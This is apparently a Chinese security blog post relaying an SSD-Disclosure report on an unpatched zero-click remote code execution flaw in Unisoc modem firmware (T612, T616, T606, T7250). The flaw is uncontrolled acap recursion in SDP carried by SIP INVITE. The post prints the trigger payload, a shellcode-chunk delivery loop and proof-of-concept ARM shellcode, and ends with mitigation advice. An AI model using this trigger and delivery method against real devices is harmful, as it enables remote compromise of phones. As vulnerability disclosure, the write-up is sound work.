#  【0DAY漏洞】 全球5G手机芯片厂商之一‌的紫光展锐SOC存在RCE漏洞，影响数十家手机厂商，还未发布补丁  
YGnight
                    YGnight  night安全   2026-08-18 11:53  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LAQpgdWQSctVS8Ps0NsFTqMiasz8uDibcvoib0spt17ORFYGT7Lk8y0JElHpWukiczXboIicO8mrOUut0DwfE4PvMwpuReeibS0yQHqN8Tictdm4Z4/640?wx_fmt=png&from=appmsg "")  
  
## 漏洞描述  
  
紫光展锐是中国集成电路设计产业的主要企业，‌全球公开市场 3 家 5G 手机芯片厂商之一‌。收到情报紫光展锐移动 modem 固件蜂窝网络侧存在远程代码执行缺陷0DAY漏洞。攻击面位于 SIP 信令层，畸形 SDP 载荷经 SIP INVITE 抵带至目标 modem，触发内存破坏并在受害 modem 上执行任意原生代码。载体是 SIP 消息内夹带的 SDP，无需受害者交互，双方处于同一电话网络可达路径即成立。经查询涉及此楼的4个展锐 SoC 平台：T612、T616（官方已更名 T7255）、T606、T7250。这些平台广泛用于入门/低端 Android 机型，覆盖约 10 个品牌  
  
这个漏洞归类为 CWE-674 不受控递归。modem 解析 SDP 时，acap 属性解码函数 _SDPDEC_AcapDecoder 未设递归调用上限。单行属性内连续出现多个 acap 时，SIP 任务栈持续向下生长，越过自身栈边界踩入相邻 sblock_0_2 任务栈，从而导致栈溢出问题。  
<table><tbody><tr><th style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);text-align: left;font-weight: 600;color: rgb(17, 24, 39);background: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">漏洞类型</span></section></th><td style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);color: rgb(55, 65, 81);"><section><span leaf="">不受控递归 / 栈溢出 / 远程代码执行</span></section></td></tr><tr><th style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);text-align: left;font-weight: 600;color: rgb(17, 24, 39);background: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">影响组件</span></section></th><td style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);color: rgb(55, 65, 81);"><section><span leaf="">紫光展锐 modem 固件 SDP/SIP 解析层</span></section></td></tr><tr><th style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);text-align: left;font-weight: 600;color: rgb(17, 24, 39);background: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">受影响型号</span></section></th><td style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);color: rgb(185, 28, 28);font-weight: 700;"><section><span leaf="">T612、T616、T606、T7250</span></section></td></tr><tr><th style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);text-align: left;font-weight: 600;color: rgb(17, 24, 39);background: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">受影响固件</span></section></th><td style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);color: rgb(55, 65, 81);"><section><span leaf="">MOCORTM_22A_W23.02.5_P12.14_Debug（Realme C33 搭载）</span></section></td></tr><tr><th style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);text-align: left;font-weight: 600;color: rgb(17, 24, 39);background: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">CWE</span></section></th><td style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);color: rgb(55, 65, 81);"><section><span leaf="">CWE-674 不受控递归</span></section></td></tr><tr><th style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);text-align: left;font-weight: 600;color: rgb(17, 24, 39);background: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">攻击前提</span></section></th><td style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);color: rgb(55, 65, 81);"><section><span leaf="">攻击者持有一台 UE，蜂窝网络可达，无需受害者交互</span></section></td></tr><tr><th style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);text-align: left;font-weight: 600;color: rgb(17, 24, 39);background: rgb(243, 244, 246);white-space: nowrap;"><section><span leaf="">报告来源</span></section></th><td style="padding: 9px 12px;border: 1px solid rgb(229, 231, 235);color: rgb(55, 65, 81);"><section><span leaf="">SSD-Disclosure 公开技术报告</span></section></td></tr></tbody></table>  
攻击者持一台网络可达 UE。后果：受害 modem 上执行任意原生代码。紫光展锐官方截至目前还没有发布漏洞相关补丁，也还没有公开回应。  
## 漏洞原理  
  
主要原因是acap 属性解码函数未对递归深度设限。modem 收到 SIP INVITE 后解析其 SDP，SDP 每行属性经 SipHandler_AttrDecoder 查表取得对应 handler 并调用。acap 对应 handler 为 _SDPDEC_AcapDecoder，该函数解析完当前 acap 值后读取下一属性名再查表，若仍为 acap 则递归调用自身。  
```
undefined8 _SDPDEC_AcapDecoder(Token *token, ParseBuffer *parse_buffer, SdpMsgStruct *hSdpMsg){    // ... 解析当前 acap 值 ...    iVar2 = search_handler(&token->CurrToken, SipHandler_AttrDecoder, 0x38, &handler_id);    handler = SipHandler_AttrDecoder[(int)handler_id].handler;    token->currentHandlerExecution = handler;    if ((handler == (sipHandlerFunc *)0x0) ||        (cVar1 = (*handler)(token, parse_buffer, (int)hSdpMsg), cVar1 == '\x01')) {        // handler 调用，若下一个属性仍为 acap，则递归调用自身    }}
```  
  
acap 在 handler 表中自我引用，一行内连续多个 acap 时 handler 逐层递归调用自身，全程无深度上限。触发载荷格式如下。  
```
8d0f280c 80 a0 e1 8b 3d   SipHandler [49] = "acap"00 00 00 c3 15 c9 8b
```  
```
v=0a=acap:1 acap:1 acap:1 acap:1 acap:1 acap:1 acap:1 acap:1 [...] acap:1
```  
  
递归层数叠加，SIP 任务栈持续消耗内存，越过自身栈边界写入相邻 sblock_0_2 任务栈，栈溢出。  
```
for i, part in enumerate(get_shellcode_parts()):    send_exploit(part, SIP_SEQ_ID, 165 - i * 8)    SIP_SEQ_ID += 1
```  
  
栈溢出后，原生的shellcode分块写入后续的SIP请求，modem 内存暂存拼接。shellcode是ARM Thumb 汇编，向固定地址 0x8d0f270c 写入标记值 0xdeadbeef，确认代码执行在 modem 上成立。  
```
_second_chunk:    movw r1, #0x270c    movt r1, #0x8d0f    movw r2, #0xbeef    movt r2, #0xdead    str r2, [r1]
```  
  
验证脚本 dump_modem.sh 经 adb 导出整块 modem 内存，analysis.py 解析 0x372F000 起始的寄存器区，得到 r1 = 0x8d0f270c、r2 = 0xdeadbeef。0xdeadbeef 已写入目标地址，代码执行在 modem 环境成立。  
## 修复建议  
  
官方修复状态：紫光展锐官方截至目前还没有发布漏洞相关补丁，无明确修复时间表，等待厂商后续固件推送。由于modem 固件是闭源的，使用的用户是无法自查或修复防御的，能做的就是保持运营商固件为最新、避免接入不可信漫游和SIM网络  
  
